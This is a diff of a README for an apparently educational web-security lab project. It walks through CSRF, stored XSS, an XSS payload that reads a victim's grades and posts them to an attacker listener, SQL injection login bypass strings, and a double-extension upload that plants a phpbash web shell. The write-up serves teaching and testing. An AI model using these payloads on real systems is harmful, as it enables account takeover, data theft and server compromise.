@@ -1,48 +1,205 @@
 * Summary
 This is the readme file for FLAG.
 
-* Distinct Vulnerabilities [6/20]
+* Dependency
+Running the attack requires python installed with the following
+packages:
 
-** DONE CSRF
-** Cross-Site Data Access
+- torando
+- cmd2
+- bs4
 
-** DONE Stored XSS
+All of them can be easily installed through pip.
 
-** TODO Reflected XSS
+* How to run the attacks
+First, open the shell by 
 
-** TODO DOM-Based XSS
+#+BEGIN_SRC bash
+python shell.py
+#+END_SRC
 
-** TODO UI Redress
+Then, login as the victim by typing
 
-** TODO Cookie Injection
+#+BEGIN_SRC 
+>>> victim <victim_name>
+#+END_SRC
 
-** TODO Client-Side HTTP Parameter Pollution
+which will open up firefox, and you may login as the victim (Please
+login as the victim_name as you input, otherwise things might not work).
 
-** DONE SQL Injection
+All the attacks will work against the logged in victim.
 
-** OS Command Injection
+* Distinct Vulnerabilities 
 
-** DONE File Upload
+** Cross-Site Request Forgery
+To perform a csrf, I create a page in which there is an auto-submitted
+form to the target url (in this case
+"http://35.186.175.202/edit-profile.php"), along with parameters such
+as "about_me". I also set its target to an invisible iframe in the
+same page so that when victim clicks the bait link, he/she will not
+notice page redirection.
 
-** TODO File Inclusion
+To enable auto-submit, I used embedded javascript in the "onload"
+attribute of "<body>":
 
-** DONE Path Sanitation Bypass
+#+BEGIN_SRC html
+    <body onload="document.forms[0].submit();">
+#+END_SRC
 
-** TODO Client-Only Input Validation
+The shell command for this attack is "csrf", upon entered it will fire
+up firefox with the attacker's site. Visiting the site when you have
+logged in as the victim will change the victim's profile to whatever
+you specified.
 
-** TODO Client-Hidden Sensitive Data
+*** How to run the attack
 
-** TODO Insecure Direct Object Reference
+#+BEGIN_SRC 
+>>> csrf <profile_message>
+#+END_SRC
 
-** TODO Parameter-Based Access Control
+** Stored XSS
+To perform stored XSS, I created a page which will store arbitrary
+code we want to inject. In shell.py we inject the following javascript
+snippet to the page "/profile.php":
 
-** TODO Referrer-Based Access Control
+#+BEGIN_SRC javascript
+<script>alert('You are XSS-ed!')</script>
+#+END_SRC
 
-** TODO Multi-Stage Functions with only some pages authenticated
+This will cause any visit to "/profile.php" to run the snippet and
+pops up alert.
 
-** TODO Session Cookie Prediction
+*** How to run the attack
 
-** DONE Session Fixation
+#+BEGIN_SRC 
+>>> sxss
+#+END_SRC
 
-** TODO Bad Password Hashing
+** Cross-Site Data Access (xsda)
+I used SXSS as a stepstone for xsda. First, I inject the a javascript
+snippet in the comment section of the victim's profile.
+
+#+BEGIN_SRC javascript
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onload = function() {{
+    console.log(xhr.response);
+    var sender = new XMLHttpRequest();
+    sender.open('POST', 'http://localhost:{port}/grades', true);
+    sender.send(xhr.response);
+}}
+xhr.open('GET', '/list-grades.php', true);
+xhr.send(null);
+</script>
+#+END_SRC
+
+Which will initiate an XMLHttpRequest to "/grades" and fetch all the
+grades of the victim. Upon receiving the html containing the grade
+table, it initiate another XMLHttpRequest to send all the grades to a
+local server we set up through a certain port.
+
+Next, we visit the local server's page and we shall see the grade of
+the victim.
+
+*** How to run the attack
+
+#+BEGIN_SRC 
+>>> xsda
+#+END_SRC
+
+Note: the web server we set up is running in a thread, so feel free to
+type enter and continue using the shell.
+
+** SQL Injection
+I discovered a SQL injection vulnerability in several places. One of
+the most severe one is in the login page.
+
+The server side does not properly escape special characters like
+double quotes and dashes, allowing attackers to perform SQL injection.
+
+Specifically, we can login as any user using the following using name
+
+#+BEGIN_SRC 
+<username>";--
+#+END_SRC
+
+where <username> is the username you want to login as. Additionally,
+we can use the following to login as the first person in the users
+database.
+
+#+BEGIN_SRC 
+" OR 1 = 1; --
+#+END_SRC
+
+This causes the SQL query in the server side to retrieve all the user
+records. And when it wants to access the user info, it uses 
+
+#+BEGIN_SRC php
+$users[0]
+#+END_SRC
+
+which gives us the first user -- Roberto.
+
+I should mention this later but using reverse-shell we can find the
+exact code that causes this vulnerability. It's in
+"/var/www/include/db.php:14:15", "/var/www/include/db.php:38", and triggered by
+"/var/www/include/user.php:118:122".
+
+#+BEGIN_SRC php
+$args = array_map(array($this, 'quote'), $args);
+$query = str_replace(array_keys($args), array_values($args), $query);
+...
+private static function quote($str)
+{
+    return '"' . $str . '"';
+}
+#+END_SRC
+
+Here the function quote simply surround $str with two double quotes
+without any sanitization whatsoever, which causes the vulnerability.
+
+*** How to run the attack
+
+#+BEGIN_SRC 
+>>> sql_injection
+#+END_SRC
+
+This will gives us a page with a ready-to-inject form. We can click
+the inject button and it will gives us the main page of Roberto.
+
+** File Upload
+In my own opinion, this is by far the most dangerous vulnerability. I
+noticed that the server will only allow users to upload pdf
+files. However, the way it checks whether it's a pdf file is
+problematic.
+
+Upon experiment, I found that it only checks whether the file
+extension contains the string "pdf". However, a file can have a long
+extension with several dots in between. For example, one can upload a
+file "evil.pdf.php" to the server and it will be accepted. Upon next
+visit, apache server detects that the actual file type is php, so it
+will execute the file as a php script. This allows us to execute
+arbitrary program with the same priviledge as the web server itself.
+
+I uploaded a phpbase script as an assignment and the server accepts
+it. Using it I can download all the server scripts for further
+investigation which allows the last attack (i.e. bad password hashing)
+possible.
+
+
+
+*** How to run the attack
+
+#+BEGIN_SRC 
+>>> fileupload
+#+END_SRC
+
+Then, we choose "phpbash.pdf.php" and then submit. Next, we can click
+the button below to visit the file and use the phpbash.
+
+** Insecure Direct Object Reference
+
+** Session Fixation
+
+** Bad Password Hashing
 
